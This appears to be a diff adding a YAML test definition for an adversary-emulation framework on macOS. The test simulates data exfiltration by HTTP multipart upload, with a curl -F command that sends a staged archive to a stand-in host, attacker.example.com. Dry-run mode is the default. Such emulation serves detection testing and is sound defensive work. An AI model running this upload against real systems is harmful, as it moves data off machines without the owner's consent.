@@ -1,0 +1,121 @@
+id: 010-http-multipart-upload
+name: HTTP Multipart Form Upload
+description: Exfiltrates data using HTTP multipart/form-data POST requests
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: d0e1f2a3-b4c5-4d6e-7f80-91a2b3c4d5e6
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to upload
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  upload_url:
+    description: HTTP form upload endpoint
+    type: string
+    default: "http://attacker.example.com/form-upload.php"
+  form_field:
+    description: Form field name for file
+    type: string
+    default: "datafile"
+  additional_params:
+    description: Additional form parameters
+    type: string
+    default: "user=exfil&session=test"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Calculate file checksum
+    type: command
+    executor: bash
+    command: |
+      echo "File: $(basename '{{ args.file_path }}')"
+      echo "Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      if command -v md5 &> /dev/null; then
+        echo "MD5: $(md5 -q '{{ args.file_path }}')"
+      else
+        echo "MD5: $(md5sum '{{ args.file_path }}' | awk '{print $1}')"
+      fi
+    cleanup: false
+  
+  - name: Prepare upload parameters
+    type: command
+    executor: bash
+    command: |
+      echo "HTTP Multipart Upload Configuration:"
+      echo "  URL: {{ args.upload_url }}"
+      echo "  Form field: {{ args.form_field }}"
+      echo "  File: $(basename '{{ args.file_path }}')"
+      echo "  Additional params: {{ args.additional_params }}"
+    cleanup: false
+  
+  - name: Execute multipart upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: HTTP Multipart Upload"
+        echo "Command: curl -F {{ args.form_field }}=@'{{ args.file_path }}' \\\"
+        echo "  {{ args.upload_url }}?{{ args.additional_params }}\""
+      else
+        # Build parameter string
+        params=""
+        for param in {{ args.additional_params }}; do
+          params="$params -F \"$param\""
+        done
+        
+        curl -F "{{ args.form_field }}=@'{{ args.file_path }}'" \
+          $params \
+          '{{ args.upload_url }}'
+      fi
+    cleanup: false
+checks:
+  - name: Valid upload URL
+    description: Verify HTTP endpoint is properly formatted
+    type: command
+    command: echo '{{ args.upload_url }}' | grep -qE '^https?://' && echo "Valid URL"
+  
+  - name: File readable
+    description: Verify file is accessible
+    type: command
+    command: test -r '{{ args.file_path }}'
+tests:
+  dry_run:
+    - name: Test HTTP multipart upload (dry-run)
+      description: Test multipart form upload without actual request
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: dd if=/dev/zero of=/tmp/test_upload.bin bs=1K count=10 2>/dev/null
+        
+        - name: Prepare multipart request
+          type: command
+          executor: bash
+          command: |
+            echo "Multipart Form Upload Simulation:"
+            echo "curl -F file=@/tmp/test_upload.bin http://localhost/upload"
+        
+        - name: Show file info
+          type: command
+          executor: bash
+          command: ls -lh /tmp/test_upload.bin
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_upload.bin
+    ignore_errors: true
